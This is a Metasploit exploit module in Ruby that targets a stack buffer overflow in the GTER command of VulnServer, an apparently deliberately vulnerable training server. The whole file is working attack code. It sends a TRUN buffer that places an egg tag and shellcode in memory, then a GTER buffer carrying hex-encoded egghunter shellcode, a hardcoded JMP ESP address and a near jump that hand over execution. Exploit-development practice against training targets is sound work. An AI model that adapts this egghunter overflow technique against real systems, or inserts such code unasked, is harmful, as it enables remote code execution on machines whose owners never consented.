##
# This module requires Metasploit Framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VulnServer GTER EggHunter Buffer Overflow',
      'Description'    => %q{
        Exploits a stack buffer overflow in the GTER command of VulnServer.
        An egghunter locates a payload placed in memory via the TRUN command.
      },
      'Author'         => [ 'fxw' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x0d"
        },
      'Targets'        =>
        [
          [ 'VulnServer x86', { 'jmpesp' => 0x625026D3 } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2022-03-30'
    ))

    register_options(
      [
        Opt::RHOSTS,
        Opt::RPORT(9999),

        OptInt.new('RETOFFSET_GTER',
          [ true, 'Offset to EIP in GTER', 135 ]),

        OptInt.new('RETOFFSET_TRUN',
          [ true, 'Offset to EIP in TRUN', 1995 ]),

        OptString.new('EGG_TAG',
          [ true, '4-byte egg tag repeated twice', 'w00tw00t' ]),

        OptString.new('EGG_HUNTER',
          [ true, 'Egghunter shellcode (hex)',
            '33d26681caff0f33db425353525353536a2958b3c064ff1383c40c5a83c4083c0574dfb8773030748bfaaf75daaf75d7ffe7'
          ]),

        OptString.new('NEAR_JUMP',
          [ true, 'Near JMP (E9 rel32, hex)', 'e970ffffff' ])
      ]
    )
  end

  def exploit
    print_status('Preparing exploit buffers')

    egghunter  = [datastore['EGG_HUNTER']].pack('H*')
    near_jump  = [datastore['NEAR_JUMP']].pack('H*')
    egg_tag    = datastore['EGG_TAG']
    shellcode  = payload.encoded
    jmpesp     = [target['jmpesp']].pack('V')

    #
    # ---- TRUN payload (egg + shellcode)
    #
    trun_payload =
      'TRUN /.:/' +
      egg_tag +
      shellcode +
      "\x90" * (
        datastore['RETOFFSET_TRUN'] -
        egg_tag.length -
        shellcode.length -
        5
      ) +
      near_jump +
      jmpesp +
      near_jump

    #
    # ---- GTER payload (egghunter)
    #
    gter_payload =
      'GTER /.:/' +
      "\x90" * 10 +
      egghunter +
      "\x90" * (
        datastore['RETOFFSET_GTER'] -
        egghunter.length -
        10
      ) +
      jmpesp +
      near_jump

    #
    # Send TRUN
    #
    print_status('Sending TRUN payload')
    connect
    sock.put(trun_payload)
    disconnect

    #
    # Send GTER
    #
    print_status('Sending GTER egghunter')
    connect
    sock.put(gter_payload)
    disconnect

    handler
  end
end
